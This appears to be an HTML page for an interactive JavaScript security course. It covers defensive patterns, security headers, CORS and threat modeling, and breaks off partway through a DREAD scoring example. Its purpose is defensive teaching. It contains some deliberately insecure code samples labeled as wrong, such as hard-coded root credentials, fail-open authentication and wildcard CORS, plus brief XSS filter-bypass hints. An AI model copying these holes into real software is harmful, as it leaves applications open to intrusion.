<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>JS Security Advanced ‚Äî Master Course</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#0a0e17;--surface:#111827;--surface2:#1e293b;--surface3:#293548;
  --accent:#3b82f6;--accent2:#10b981;--accent3:#f59e0b;--danger:#ef4444;
  --text:#e2e8f0;--text2:#94a3b8;--text3:#64748b;
  --code-bg:#0d1117;--border:#1e293b;
  --radius:10px;--shadow:0 4px 24px rgba(0,0,0,.4);
}
body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;min-height:100vh}
#app{display:flex;min-height:100vh}
nav{width:260px;background:var(--surface);border-right:1px solid var(--border);padding:0;position:fixed;height:100vh;overflow-y:auto;z-index:100;display:flex;flex-direction:column}
nav .logo{padding:20px 20px 10px;border-bottom:1px solid var(--border);margin-bottom:8px}
nav .logo h2{font-size:16px;color:var(--accent);display:flex;align-items:center;gap:8px}
nav .logo h2 span{font-size:22px}
nav .logo p{font-size:11px;color:var(--text3);margin-top:4px}
nav .nav-section{padding:4px 12px;font-size:10px;text-transform:uppercase;letter-spacing:1.5px;color:var(--text3);margin-top:12px}
nav button{display:flex;align-items:center;gap:10px;width:calc(100% - 16px);margin:2px 8px;padding:10px 14px;background:none;border:none;color:var(--text2);font-size:13px;cursor:pointer;border-radius:8px;text-align:left;transition:.2s}
nav button:hover{background:var(--surface2);color:var(--text)}
nav button.active{background:var(--accent);color:#fff}
nav button .icon{font-size:16px;width:22px;text-align:center}
nav .progress-wrap{margin-top:auto;padding:16px;border-top:1px solid var(--border)}
nav .progress-bar{height:6px;background:var(--surface3);border-radius:3px;overflow:hidden;margin-top:6px}
nav .progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:3px;transition:width .5s}
nav .progress-text{font-size:11px;color:var(--text3);margin-top:4px}
main{margin-left:260px;flex:1;padding:32px 40px;max-width:960px}
h1{font-size:28px;margin-bottom:6px;color:#fff}
h2{font-size:22px;margin:28px 0 12px;color:#fff;display:flex;align-items:center;gap:8px}
h3{font-size:17px;margin:22px 0 8px;color:var(--accent2)}
h4{font-size:15px;margin:16px 0 6px;color:var(--accent3)}
.subtitle{color:var(--text2);font-size:14px;margin-bottom:28px}
p{margin-bottom:12px;font-size:14.5px}
ul,ol{margin:8px 0 16px 24px;font-size:14px}
li{margin-bottom:6px}
strong{color:#fff}
.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px 24px;margin:16px 0}
.card-warn{border-left:4px solid var(--danger)}
.card-info{border-left:4px solid var(--accent)}
.card-success{border-left:4px solid var(--accent2)}
.card-amber{border-left:4px solid var(--accent3)}
.card-title{font-size:14px;font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:8px}
pre{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:16px 20px;overflow-x:auto;margin:12px 0 16px;font-size:13px;line-height:1.65;position:relative}
code{font-family:'Fira Code','Cascadia Code',Consolas,monospace;font-size:13px}
p code,li code{background:var(--surface2);padding:2px 7px;border-radius:4px;font-size:12.5px;color:var(--accent2)}
.cm{color:#6a737d}.kw{color:#ff7b72}.fn{color:#d2a8ff}.str{color:#a5d6ff}.num{color:#79c0ff}.cmt{color:#8b949e;font-style:italic}
.tag-row{display:flex;gap:8px;flex-wrap:wrap;margin:8px 0 16px}
.tag{font-size:11px;padding:3px 10px;border-radius:20px;font-weight:600}
.tag-blue{background:rgba(59,130,246,.15);color:var(--accent)}
.tag-green{background:rgba(16,185,129,.15);color:var(--accent2)}
.tag-amber{background:rgba(245,158,11,.15);color:var(--accent3)}
.tag-red{background:rgba(239,68,68,.15);color:var(--danger)}
.vs-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:12px 0}
.vs-card{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:16px;position:relative}
.vs-card h4{margin:0 0 10px;font-size:13px}
.vs-bad h4{color:var(--danger)}
.vs-good h4{color:var(--accent2)}
.btn{padding:10px 20px;border-radius:8px;border:none;cursor:pointer;font-size:13px;font-weight:600;transition:.2s;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:var(--accent);color:#fff}
.btn-primary:hover{background:#2563eb}
.btn-success{background:var(--accent2);color:#fff}
.btn-success:hover{background:#059669}
.btn-outline{background:none;border:1px solid var(--border);color:var(--text2)}
.btn-outline:hover{border-color:var(--accent);color:var(--accent)}
.btn-sm{padding:6px 14px;font-size:12px}
.btn-row{display:flex;gap:10px;margin:16px 0;flex-wrap:wrap}
.quiz-option{display:block;width:100%;text-align:left;padding:12px 16px;margin:6px 0;background:var(--surface2);border:2px solid transparent;border-radius:8px;color:var(--text);font-size:14px;cursor:pointer;transition:.2s}
.quiz-option:hover{border-color:var(--accent);background:var(--surface3)}
.quiz-option.correct{border-color:var(--accent2);background:rgba(16,185,129,.1)}
.quiz-option.wrong{border-color:var(--danger);background:rgba(239,68,68,.1)}
.quiz-option.reveal{border-color:var(--accent2);opacity:.6}
.quiz-feedback{padding:12px 16px;border-radius:8px;margin:10px 0;font-size:13px;display:none}
.quiz-feedback.show{display:block}
.quiz-feedback.correct-fb{background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.3);color:var(--accent2)}
.quiz-feedback.wrong-fb{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:var(--danger)}
.exercise-area{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;margin:12px 0}
.exercise-area textarea{width:100%;min-height:120px;background:transparent;border:none;color:var(--text);font-family:'Fira Code',Consolas,monospace;font-size:13px;padding:16px;resize:vertical;outline:none;line-height:1.6}
.result-box{padding:12px 16px;border-radius:8px;margin:8px 0;font-size:13px;font-family:monospace}
.result-pass{background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.2);color:var(--accent2)}
.result-fail{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:var(--danger)}
.tabs{display:flex;gap:4px;border-bottom:1px solid var(--border);margin-bottom:20px}
.tab{padding:10px 18px;font-size:13px;font-weight:600;color:var(--text3);background:none;border:none;cursor:pointer;border-bottom:2px solid transparent;transition:.2s}
.tab:hover{color:var(--text)}
.tab.active{color:var(--accent);border-color:var(--accent)}
.score-display{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;background:var(--surface2);border-radius:20px;font-size:13px;font-weight:600;margin:8px 0}
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:12px 0}
.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin:12px 0}
table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13px}
th{background:var(--surface2);padding:10px 14px;text-align:left;font-size:12px;text-transform:uppercase;letter-spacing:.5px;color:var(--text2);border-bottom:2px solid var(--border)}
td{padding:10px 14px;border-bottom:1px solid var(--border)}
tr:hover td{background:var(--surface)}
.checklist label{display:flex;align-items:flex-start;gap:10px;padding:8px 12px;margin:4px 0;border-radius:6px;cursor:pointer;font-size:13px;transition:.15s}
.checklist label:hover{background:var(--surface2)}
.checklist input[type="checkbox"]{margin-top:3px;accent-color:var(--accent2)}
.lesson-nav{display:flex;justify-content:space-between;margin-top:40px;padding-top:20px;border-top:1px solid var(--border)}
.counter{display:flex;align-items:center;gap:12px;margin:12px 0}
.counter .num{font-size:28px;font-weight:800;color:var(--accent)}
.threat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;margin:8px 0;cursor:pointer;transition:.2s}
.threat-card:hover{border-color:var(--accent)}
.threat-card.expanded .threat-detail{display:block}
.threat-detail{display:none;margin-top:10px;padding-top:10px;border-top:1px solid var(--border);font-size:13px;color:var(--text2)}
.header-demo{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;margin:10px 0}
.header-demo .header-name{font-weight:700;color:var(--accent);font-family:monospace;font-size:14px}
.header-demo .header-val{color:var(--accent2);font-family:monospace;font-size:12px;margin:4px 0 8px;word-break:break-all}
.dnd-container{display:flex;gap:20px;margin:16px 0;flex-wrap:wrap}
.dnd-pool{min-height:60px;background:var(--surface2);border:2px dashed var(--border);border-radius:8px;padding:10px;flex:1;min-width:200px}
.dnd-item{display:inline-block;padding:6px 14px;margin:4px;background:var(--accent);color:#fff;border-radius:6px;font-size:12px;font-weight:600;cursor:grab}
.dnd-item:active{cursor:grabbing}
.drop-zone{min-height:40px;border:2px dashed var(--surface3);border-radius:8px;padding:8px;margin:6px 0;transition:.2s}
.drop-zone.over{border-color:var(--accent);background:rgba(59,130,246,.05)}
.drop-zone .dnd-item{background:var(--accent2)}
.scenario-box{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin:16px 0}
.scenario-box h4{color:var(--accent3);margin:0 0 10px}
.scenario-box p{font-size:13px;color:var(--text2)}
.collapsible{margin:8px 0}
.collapsible-header{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;background:var(--surface2);border-radius:8px;cursor:pointer;font-weight:600;font-size:14px;transition:.2s}
.collapsible-header:hover{background:var(--surface3)}
.collapsible-body{padding:12px 16px;display:none;font-size:14px}
.collapsible.open .collapsible-body{display:block}
.collapsible.open .collapsible-header{border-radius:8px 8px 0 0;background:var(--surface3)}
.floating-score{position:fixed;bottom:24px;right:24px;background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:12px 20px;box-shadow:var(--shadow);z-index:50;font-size:13px;display:flex;align-items:center;gap:10px}
.floating-score .pts{color:var(--accent2);font-weight:800;font-size:18px}
@media(max-width:900px){
  nav{width:60px;overflow:visible}
  nav .logo p,nav .nav-section,nav button span:not(.icon),nav .progress-wrap .progress-text{display:none}
  nav .logo h2{font-size:0}nav .logo h2 span{font-size:20px}
  nav button{justify-content:center;padding:12px}
  nav button .icon{width:auto}
  main{margin-left:60px;padding:20px}
  .vs-grid,.grid-2{grid-template-columns:1fr}
  .grid-3{grid-template-columns:1fr 1fr}
}
@media(max-width:600px){
  main{padding:16px}
  .grid-3{grid-template-columns:1fr}
  .dnd-container{flex-direction:column}
}
.fade-in{animation:fadeIn .3s ease}
@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.pulse{animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
</style>
</head>
<body>
<div id="app">
<nav id="sidebar"></nav>
<main id="content" class="fade-in"></main>
</div>
<div class="floating-score" id="floatingScore">
  üèÜ XP: <span class="pts" id="xpDisplay">0</span>
</div>

<script>
// ============================================================
// DATA
// ============================================================
const state = {
  section: 'learn',
  lesson: 0,
  subTab: 0,
  xp: parseInt(localStorage.getItem('sec_xp')||'0'),
  completed: JSON.parse(localStorage.getItem('sec_done')||'{}'),
  quizAnswers: {},
  exerciseResults: {}
};

function addXP(n){
  state.xp+=n;
  localStorage.setItem('sec_xp',state.xp);
  document.getElementById('xpDisplay').textContent=state.xp;
}
function markDone(key){
  if(!state.completed[key]){state.completed[key]=true;localStorage.setItem('sec_done',JSON.stringify(state.completed));addXP(10);}
  renderSidebar();
}
function getProgress(){
  const total=lessons.length+quizQuestions.length+exercises.length;
  const done=Object.keys(state.completed).length;
  return Math.min(100,Math.round(done/total*100));
}

// ============================================================
// LESSONS
// ============================================================
const lessons = [
// ---- LESSON 0 ----
{
  title: "Advanced Security Patterns",
  icon: "üõ°Ô∏è",
  content: `
<h1>üõ°Ô∏è Advanced Security Patterns</h1>
<p class="subtitle">Core defensive patterns every JavaScript developer must master</p>
<div class="tag-row">
  <span class="tag tag-blue">Defense in Depth</span>
  <span class="tag tag-green">Least Privilege</span>
  <span class="tag tag-amber">Secure by Default</span>
</div>

<h2>üéØ Why Security Patterns Matter</h2>
<p>Security isn't a feature ‚Äî it's a <strong>property</strong> of your entire system. Advanced security patterns give you <strong>repeatable, proven strategies</strong> to protect applications. In competitive interviews, you'll be asked to demonstrate these concepts in code.</p>

<div class="card card-info">
  <div class="card-title">üí° Key Insight</div>
  <p>Security patterns are like design patterns ‚Äî they solve recurring problems. The difference is that getting them wrong can cost millions.</p>
</div>

<h2>1. Defense in Depth</h2>
<p>Never rely on a single security control. Layer multiple defenses so that if one fails, others still protect the system.</p>
<pre><code><span class="cmt">// LAYER 1: Input validation at API boundary</span>
<span class="kw">function</span> <span class="fn">createUser</span>(req, res) {
  <span class="kw">const</span> { email, name } = req.body;
  
  <span class="cmt">// LAYER 1: Schema validation</span>
  <span class="kw">if</span> (!validator.isEmail(email)) <span class="kw">throw new</span> ValidationError();
  
  <span class="cmt">// LAYER 2: Sanitize before storage</span>
  <span class="kw">const</span> safeName = DOMPurify.sanitize(name);
  
  <span class="cmt">// LAYER 3: Parameterized query (prevents SQL injection)</span>
  db.query(<span class="str">'INSERT INTO users (email, name) VALUES ($1, $2)'</span>,
    [email, safeName]);
  
  <span class="cmt">// LAYER 4: Output encoding when rendering</span>
  <span class="cmt">// LAYER 5: CSP headers prevent inline script execution</span>
  <span class="cmt">// LAYER 6: HttpOnly cookies prevent token theft</span>
}</code></pre>

<h2>2. Principle of Least Privilege</h2>
<p>Every component should have the <strong>minimum permissions</strong> needed to function. No more.</p>

<div class="vs-grid">
<div class="vs-card vs-bad">
<h4>‚ùå Over-Privileged</h4>
<pre><code><span class="cmt">// Giving admin DB access to a read-only API</span>
<span class="kw">const</span> db = mysql.connect({
  user: <span class="str">'root'</span>,         <span class="cmt">// NEVER!</span>
  password: <span class="str">'admin123'</span>
});

<span class="cmt">// API key with full access</span>
<span class="kw">const</span> stripe = Stripe(ADMIN_KEY);</code></pre>
</div>
<div class="vs-card vs-good">
<h4>‚úÖ Least Privilege</h4>
<pre><code><span class="cmt">// Read-only user for read endpoints</span>
<span class="kw">const</span> db = mysql.connect({
  user: <span class="str">'api_readonly'</span>,
  password: process.env.DB_READONLY_PW
});

<span class="cmt">// Restricted API key</span>
<span class="kw">const</span> stripe = Stripe(RESTRICTED_KEY);</code></pre>
</div>
</div>

<h2>3. Input Validation: Whitelist vs Blacklist</h2>
<p><strong>Always whitelist (allowlist)</strong>. Define what IS allowed rather than trying to block what's bad.</p>

<div class="vs-grid">
<div class="vs-card vs-bad">
<h4>‚ùå Blacklist (Fragile)</h4>
<pre><code><span class="cmt">// Trying to block bad characters</span>
<span class="kw">function</span> <span class="fn">sanitize</span>(input) {
  <span class="kw">return</span> input
    .replace(<span class="str">/&lt;script&gt;/gi</span>, <span class="str">''</span>)
    .replace(<span class="str">/javascript:/gi</span>, <span class="str">''</span>)
    .replace(<span class="str">/on\\w+=/gi</span>, <span class="str">''</span>);
  <span class="cmt">// Easily bypassed!</span>
  <span class="cmt">// &lt;ScRiPt&gt;, java&#x73;cript:, etc.</span>
}</code></pre>
</div>
<div class="vs-card vs-good">
<h4>‚úÖ Whitelist (Robust)</h4>
<pre><code><span class="cmt">// Only allow known-good patterns</span>
<span class="kw">function</span> <span class="fn">validateUsername</span>(input) {
  <span class="kw">const</span> pattern = <span class="str">/^[a-zA-Z0-9_]{3,20}$/</span>;
  <span class="kw">if</span> (!pattern.test(input)) {
    <span class="kw">throw new</span> Error(<span class="str">'Invalid username'</span>);
  }
  <span class="kw">return</span> input;
}</code></pre>
</div>
</div>

<h2>4. Output Encoding (Context-Aware)</h2>
<p>Always encode output based on the <strong>context</strong> where it will be rendered:</p>

<pre><code><span class="cmt">// Different contexts need different encoding!</span>

<span class="cmt">// 1. HTML Body context</span>
element.textContent = userInput;  <span class="cmt">// Safe: auto-encodes</span>
element.innerHTML = userInput;    <span class="cmt">// DANGEROUS!</span>

<span class="cmt">// 2. HTML Attribute context</span>
el.setAttribute(<span class="str">'data-value'</span>, encodeForHTMLAttr(input));

<span class="cmt">// 3. JavaScript context</span>
<span class="kw">const</span> safe = JSON.stringify(userInput); <span class="cmt">// For embedding in JS</span>

<span class="cmt">// 4. URL context</span>
<span class="kw">const</span> url = <span class="str">\`/search?q=\${encodeURIComponent(input)}\`</span>;

<span class="cmt">// 5. CSS context</span>
el.style.color = CSS.escape(userInput); <span class="cmt">// Rare but important</span></code></pre>

<h2>5. Fail Securely</h2>
<p>When something goes wrong, the system should <strong>deny access by default</strong>, not grant it.</p>

<pre><code><span class="cmt">// ‚ùå Fails OPEN ‚Äî grants access on error</span>
<span class="kw">function</span> <span class="fn">checkAuth</span>(token) {
  <span class="kw">try</span> {
    <span class="kw">return</span> jwt.verify(token, SECRET);
  } <span class="kw">catch</span>(e) {
    <span class="kw">return</span> { role: <span class="str">'user'</span>, authenticated: <span class="kw">true</span> }; <span class="cmt">// WRONG!</span>
  }
}

<span class="cmt">// ‚úÖ Fails CLOSED ‚Äî denies access on error</span>
<span class="kw">function</span> <span class="fn">checkAuth</span>(token) {
  <span class="kw">try</span> {
    <span class="kw">return</span> jwt.verify(token, SECRET);
  } <span class="kw">catch</span>(e) {
    logger.warn(<span class="str">'Auth failed'</span>, { error: e.message });
    <span class="kw">return null</span>;  <span class="cmt">// Caller must handle null = denied</span>
  }
}</code></pre>

<h2>6. Don't Trust the Client</h2>
<pre><code><span class="cmt">// ‚ùå Trusting client-side price calculation</span>
app.post(<span class="str">'/checkout'</span>, (req, res) => {
  <span class="kw">const</span> { itemId, price } = req.body; <span class="cmt">// price from client!</span>
  processPayment(price);  <span class="cmt">// Attacker sends price: 0.01</span>
});

<span class="cmt">// ‚úÖ Server calculates everything</span>
app.post(<span class="str">'/checkout'</span>, (req, res) => {
  <span class="kw">const</span> { itemId } = req.body;
  <span class="kw">const</span> item = db.getItem(itemId);
  <span class="kw">const</span> price = item.price;  <span class="cmt">// Server-side truth</span>
  processPayment(price);
});</code></pre>

<h2>7. Secure Token Patterns</h2>
<pre><code><span class="cmt">// Secure JWT configuration</span>
<span class="kw">const</span> token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,
  {
    algorithm: <span class="str">'HS256'</span>,       <span class="cmt">// Explicit algorithm</span>
    expiresIn: <span class="str">'15m'</span>,          <span class="cmt">// Short-lived</span>
    issuer: <span class="str">'myapp.com'</span>,       <span class="cmt">// Verify issuer</span>
    audience: <span class="str">'myapp-api'</span>,     <span class="cmt">// Verify audience</span>
  }
);

<span class="cmt">// Verification with all checks</span>
<span class="kw">const</span> decoded = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: [<span class="str">'HS256'</span>],     <span class="cmt">// MUST whitelist algorithms</span>
  issuer: <span class="str">'myapp.com'</span>,
  audience: <span class="str">'myapp-api'</span>,
});</code></pre>

<h2>8. Rate Limiting Pattern</h2>
<pre><code><span class="cmt">// Token bucket rate limiter</span>
<span class="kw">class</span> <span class="fn">RateLimiter</span> {
  <span class="kw">constructor</span>(maxRequests, windowMs) {
    <span class="kw">this</span>.limits = <span class="kw">new</span> Map();
    <span class="kw">this</span>.max = maxRequests;
    <span class="kw">this</span>.window = windowMs;
  }
  
  <span class="fn">isAllowed</span>(clientId) {
    <span class="kw">const</span> now = Date.now();
    <span class="kw">const</span> record = <span class="kw">this</span>.limits.get(clientId) 
      || { count: <span class="num">0</span>, start: now };
    
    <span class="kw">if</span> (now - record.start > <span class="kw">this</span>.window) {
      record.count = <span class="num">1</span>;
      record.start = now;
    } <span class="kw">else</span> {
      record.count++;
    }
    
    <span class="kw">this</span>.limits.set(clientId, record);
    <span class="kw">return</span> record.count <= <span class="kw">this</span>.max;
  }
}

<span class="cmt">// Usage: 100 requests per minute</span>
<span class="kw">const</span> limiter = <span class="kw">new</span> RateLimiter(<span class="num">100</span>, <span class="num">60000</span>);

app.use((req, res, next) => {
  <span class="kw">if</span> (!limiter.isAllowed(req.ip)) {
    <span class="kw">return</span> res.status(<span class="num">429</span>).json({ error: <span class="str">'Too many requests'</span> });
  }
  next();
});</code></pre>
`
},

// ---- LESSON 1 ----
{
  title: "Security Headers Deep Dive",
  icon: "üîí",
  content: `
<h1>üîí Security Headers Deep Dive</h1>
<p class="subtitle">HTTP headers that form your application's first line of defense</p>

<div class="card card-info">
  <div class="card-title">üí° Why Headers Matter</div>
  <p>Security headers instruct the browser HOW to handle your content. Without them, browsers use permissive defaults that attackers exploit. Many companies check headers first in security audits.</p>
</div>

<h2>1. Content-Security-Policy (CSP)</h2>
<p>The <strong>most powerful</strong> security header. Controls which resources the browser is allowed to load.</p>

<pre><code><span class="cmt">// Express.js - Setting CSP</span>
app.use((req, res, next) => {
  res.setHeader(<span class="str">'Content-Security-Policy'</span>, [
    <span class="str">"default-src 'self'"</span>,           <span class="cmt">// Only own origin</span>
    <span class="str">"script-src 'self' 'nonce-abc123'"</span>, <span class="cmt">// Scripts: self + nonce</span>
    <span class="str">"style-src 'self' 'unsafe-inline'"</span>,  <span class="cmt">// Styles (inline needed)</span>
    <span class="str">"img-src 'self' data: https:"</span>,       <span class="cmt">// Images</span>
    <span class="str">"connect-src 'self' https://api.example.com"</span>, <span class="cmt">// XHR/Fetch</span>
    <span class="str">"font-src 'self' https://fonts.gstatic.com"</span>,
    <span class="str">"object-src 'none'"</span>,               <span class="cmt">// Block plugins</span>
    <span class="str">"frame-ancestors 'none'"</span>,           <span class="cmt">// No iframe embedding</span>
    <span class="str">"base-uri 'self'"</span>,                  <span class="cmt">// Block base tag hijack</span>
    <span class="str">"form-action 'self'"</span>,               <span class="cmt">// Form targets</span>
    <span class="str">"upgrade-insecure-requests"</span>,        <span class="cmt">// HTTP ‚Üí HTTPS</span>
    <span class="str">"report-uri /csp-report"</span>            <span class="cmt">// Violation reports</span>
  ].join(<span class="str">'; '</span>));
  next();
});</code></pre>

<h3>CSP Nonces (Best Practice)</h3>
<pre><code><span class="cmt">// Generate unique nonce per request</span>
<span class="kw">const</span> crypto = require(<span class="str">'crypto'</span>);

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(<span class="num">16</span>).toString(<span class="str">'base64'</span>);
  res.setHeader(<span class="str">'Content-Security-Policy'</span>,
    <span class="str">\`script-src 'nonce-\${res.locals.nonce}'\`</span>
  );
  next();
});

<span class="cmt">// In HTML template:</span>
<span class="cmt">// &lt;script nonce="{{nonce}}"&gt;...safe code...&lt;/script&gt;</span>
<span class="cmt">// Injected scripts won't have the nonce ‚Üí BLOCKED!</span></code></pre>

<h2>2. Essential Security Headers</h2>
<table>
<tr><th>Header</th><th>Value</th><th>Purpose</th></tr>
<tr><td><code>Strict-Transport-Security</code></td><td><code>max-age=31536000; includeSubDomains; preload</code></td><td>Force HTTPS for 1 year</td></tr>
<tr><td><code>X-Content-Type-Options</code></td><td><code>nosniff</code></td><td>Prevent MIME-type sniffing</td></tr>
<tr><td><code>X-Frame-Options</code></td><td><code>DENY</code></td><td>Prevent clickjacking</td></tr>
<tr><td><code>Referrer-Policy</code></td><td><code>strict-origin-when-cross-origin</code></td><td>Control referrer info</td></tr>
<tr><td><code>Permissions-Policy</code></td><td><code>camera=(), microphone=(), geolocation=()</code></td><td>Disable browser features</td></tr>
<tr><td><code>X-XSS-Protection</code></td><td><code>0</code></td><td>Disable (legacy, can cause issues)</td></tr>
<tr><td><code>Cross-Origin-Opener-Policy</code></td><td><code>same-origin</code></td><td>Isolate browsing context</td></tr>
<tr><td><code>Cross-Origin-Resource-Policy</code></td><td><code>same-origin</code></td><td>Prevent cross-origin reads</td></tr>
</table>

<h2>3. Complete Express.js Security Headers Setup</h2>
<pre><code><span class="kw">const</span> helmet = require(<span class="str">'helmet'</span>);

<span class="cmt">// helmet sets many headers automatically</span>
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: [<span class="str">"'self'"</span>],
      scriptSrc: [<span class="str">"'self'"</span>],
      styleSrc: [<span class="str">"'self'"</span>, <span class="str">"'unsafe-inline'"</span>],
      imgSrc: [<span class="str">"'self'"</span>, <span class="str">"data:"</span>, <span class="str">"https:"</span>],
      connectSrc: [<span class="str">"'self'"</span>],
      fontSrc: [<span class="str">"'self'"</span>],
      objectSrc: [<span class="str">"'none'"</span>],
      frameSrc: [<span class="str">"'none'"</span>],
      upgradeInsecureRequests: [],
    },
  },
  hsts: { maxAge: <span class="num">31536000</span>, includeSubDomains: <span class="kw">true</span>, preload: <span class="kw">true</span> },
  frameguard: { action: <span class="str">'deny'</span> },
  referrerPolicy: { policy: <span class="str">'strict-origin-when-cross-origin'</span> },
}));

<span class="cmt">// Additional headers helmet doesn't set</span>
app.use((req, res, next) => {
  res.setHeader(<span class="str">'Permissions-Policy'</span>,
    <span class="str">'camera=(), microphone=(), geolocation=()'</span>);
  res.setHeader(<span class="str">'Cross-Origin-Opener-Policy'</span>, <span class="str">'same-origin'</span>);
  res.setHeader(<span class="str">'Cross-Origin-Resource-Policy'</span>, <span class="str">'same-origin'</span>);
  next();
});</code></pre>

<h2>4. Cookie Security Flags</h2>
<pre><code>res.cookie(<span class="str">'session'</span>, token, {
  httpOnly: <span class="kw">true</span>,    <span class="cmt">// JS can't access ‚Üí prevents XSS theft</span>
  secure: <span class="kw">true</span>,      <span class="cmt">// HTTPS only</span>
  sameSite: <span class="str">'Strict'</span>,<span class="cmt">// Prevents CSRF</span>
  maxAge: <span class="num">900000</span>,    <span class="cmt">// 15 minutes</span>
  domain: <span class="str">'.myapp.com'</span>,
  path: <span class="str">'/'</span>,
});</code></pre>

<h2>5. CORS Configuration</h2>
<pre><code><span class="kw">const</span> cors = require(<span class="str">'cors'</span>);

<span class="cmt">// ‚ùå NEVER in production</span>
app.use(cors({ origin: <span class="str">'*'</span> }));

<span class="cmt">// ‚úÖ Whitelist specific origins</span>
<span class="kw">const</span> allowedOrigins = [
  <span class="str">'https://myapp.com'</span>,
  <span class="str">'https://admin.myapp.com'</span>
];

app.use(cors({
  origin: (origin, cb) => {
    <span class="kw">if</span> (!origin || allowedOrigins.includes(origin)) {
      cb(<span class="kw">null</span>, <span class="kw">true</span>);
    } <span class="kw">else</span> {
      cb(<span class="kw">new</span> Error(<span class="str">'CORS blocked'</span>));
    }
  },
  credentials: <span class="kw">true</span>,
  methods: [<span class="str">'GET'</span>, <span class="str">'POST'</span>, <span class="str">'PUT'</span>, <span class="str">'DELETE'</span>],
  allowedHeaders: [<span class="str">'Content-Type'</span>, <span class="str">'Authorization'</span>],
  maxAge: <span class="num">86400</span>,
}));</code></pre>

<h2>6. Testing Your Headers</h2>
<pre><code><span class="cmt">// Check headers from command line</span>
<span class="cmt">// curl -I https://yoursite.com</span>

<span class="cmt">// Online tools:</span>
<span class="cmt">// securityheaders.com ‚Üí Grades A+ to F</span>
<span class="cmt">// observatory.mozilla.org ‚Üí Comprehensive scan</span>

<span class="cmt">// Programmatic check</span>
<span class="kw">async function</span> <span class="fn">auditHeaders</span>(url) {
  <span class="kw">const</span> res = <span class="kw">await</span> fetch(url, { method: <span class="str">'HEAD'</span> });
  <span class="kw">const</span> required = [
    <span class="str">'content-security-policy'</span>,
    <span class="str">'strict-transport-security'</span>,
    <span class="str">'x-content-type-options'</span>,
    <span class="str">'x-frame-options'</span>,
    <span class="str">'referrer-policy'</span>,
  ];
  required.forEach(h => {
    <span class="kw">const</span> val = res.headers.get(h);
    console.log(val ? <span class="str">\`‚úÖ \${h}: \${val}\`</span> : <span class="str">\`‚ùå Missing: \${h}\`</span>);
  });
}</code></pre>
`
},

// ---- LESSON 2 ----
{
  title: "Threat Modeling",
  icon: "üéØ",
  content: `
<h1>üéØ Threat Modeling</h1>
<p class="subtitle">Systematically identify and prioritize security threats before attackers do</p>

<div class="card card-info">
  <div class="card-title">üí° What Is Threat Modeling?</div>
  <p>Threat modeling is a structured approach to identify potential threats, understand attack vectors, and prioritize defenses. It answers: <strong>"What can go wrong?"</strong> before you write code.</p>
</div>

<h2>üìã The 4-Step Process</h2>
<div class="grid-2">
  <div class="card"><div class="card-title">1Ô∏è‚É£ Decompose</div><p>Break down the application into components, data flows, trust boundaries</p></div>
  <div class="card"><div class="card-title">2Ô∏è‚É£ Identify Threats</div><p>Use STRIDE or other frameworks to find threats per component</p></div>
  <div class="card"><div class="card-title">3Ô∏è‚É£ Assess Risk</div><p>Prioritize using DREAD scoring or similar</p></div>
  <div class="card"><div class="card-title">4Ô∏è‚É£ Mitigate</div><p>Design countermeasures for high-priority threats</p></div>
</div>

<h2>üî† STRIDE Framework</h2>
<p>Microsoft's threat classification model. For each component, ask if these threats apply:</p>

<table>
<tr><th>Letter</th><th>Threat</th><th>Security Property</th><th>Example</th></tr>
<tr><td><strong>S</strong></td><td>Spoofing</td><td>Authentication</td><td>Attacker pretends to be another user</td></tr>
<tr><td><strong>T</strong></td><td>Tampering</td><td>Integrity</td><td>Modifying data in transit or storage</td></tr>
<tr><td><strong>R</strong></td><td>Repudiation</td><td>Non-repudiation</td><td>User denies performing an action</td></tr>
<tr><td><strong>I</strong></td><td>Info Disclosure</td><td>Confidentiality</td><td>Exposing data to unauthorized parties</td></tr>
<tr><td><strong>D</strong></td><td>Denial of Service</td><td>Availability</td><td>Making the service unavailable</td></tr>
<tr><td><strong>E</strong></td><td>Elevation of Privilege</td><td>Authorization</td><td>User gains admin access</td></tr>
</table>

<h2>üìä DREAD Scoring</h2>
<p>Rate each threat from 1-10 on five dimensions:</p>
<pre><code><span class="cmt">// DREAD = (D + R + E + A + D) / 5</span>

<span class="kw">const</span> threat = {
  name: <span class="str">'SQL Injection in login'</span>,
  
  <span class="cmt">// Damage: How bad if exploited?</span>
  damage: <span class="num">9</span>,       <span class="cmt">// Full database access</span>
  
  <span class="cmt">// Reproducibility: How easy to reproduce?</span>
  reproducibility: <span class="num">8</span>, <span class="cmt">// Reliable attack</span>
  
  <span class="cmt">// Exploitability: How easy to exploit?</span>
  exploitability: <span class="num">7</span>,  <span class="cmt">// Tools freely available</span>
  
